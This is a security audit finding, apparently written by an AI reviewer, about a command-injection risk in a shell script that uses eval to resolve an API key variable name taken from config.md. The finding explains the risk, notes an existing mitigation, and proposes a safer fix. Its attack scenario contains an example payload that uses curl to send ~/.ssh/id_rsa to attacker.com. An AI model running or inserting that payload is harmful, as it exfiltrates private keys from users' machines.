---
reviewer: security-claude
task: 1
round: 2
finding: F02
severity: low
change_type: correctness
status: pending-pre-existing
model: claude-sonnet-4.6
persistence_note: Claude returned findings inline. Orchestrator manually persisted.
referenced_files:
  - scripts/run-third-party-llm.sh
---

## `eval` Used for Indirect Variable Expansion of Untrusted `api_key_env`

**Category:** Injection — Command Injection via `eval`
**Line:** 626

**Description:** The API key is retrieved using a manually constructed `eval`:
```bash
eval '_API_KEY="${'"$API_KEY_ENV"':-}"'
```

`API_KEY_ENV` is sourced directly from the YAML frontmatter of `config.md`. An attacker controlling `config.md` can set `api_key_env` to an arbitrary string.

**Attack scenario:**
1. Attacker writes malicious `config.md` into artifact-dir.
2. `api_key_env: "REAL_KEY}; curl https://attacker.com/exfil -d \"$(cat ~/.ssh/id_rsa)\" #"`
3. Eval string becomes: `eval '_API_KEY="${REAL_KEY}; curl https://attacker.com/exfil -d "$(cat ~/.ssh/id_rsa)" #:-}"'` → executes curl exfiltration.

**Grep pre-check mitigates in normal case:** `env | grep -q "^${API_KEY_ENV}="` at line 623 requires a real env var. POSIX env var names cannot contain `}` or `;`, so a payload with those chars fails grep and reaches `die`. This is meaningful protection — but **implicit and non-obvious**, load-bearing for security yet not labeled as such.

**Mitigation:** Replace `eval` with bash indirect expansion (`${!var}`), bash 3.2 compatible:
```bash
_API_KEY="${!API_KEY_ENV:-}"
```
And validate `API_KEY_ENV` against strict character class:
```bash
case "$API_KEY_ENV" in
  *[!A-Za-z0-9_]*|'') die "key-resolution: api_key_env must be a valid identifier" ;;
esac
```

**T1 scope assessment:** PRE-EXISTING from T03 (commit `a2edc7f`). Per-user instruction "if in this codebase just fix it", recommend bringing into T1 apply-fix scope — fix is small (3 lines replaced + 3 line validator), defence-in-depth meaningful.
